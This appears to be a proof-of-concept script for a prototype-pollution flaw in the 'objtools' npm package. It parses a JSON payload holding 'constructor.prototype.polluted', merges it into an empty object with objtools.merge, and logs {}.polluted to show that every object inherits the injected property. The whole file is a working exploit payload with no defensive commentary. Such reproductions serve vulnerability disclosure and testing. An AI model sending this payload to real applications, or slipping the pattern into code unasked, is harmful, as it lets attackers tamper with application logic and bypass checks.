var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const objtools = require('objtools');
const payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
obj = {};
console.log({}.polluted);
objtools.merge(obj, payload);
console.log({}.polluted);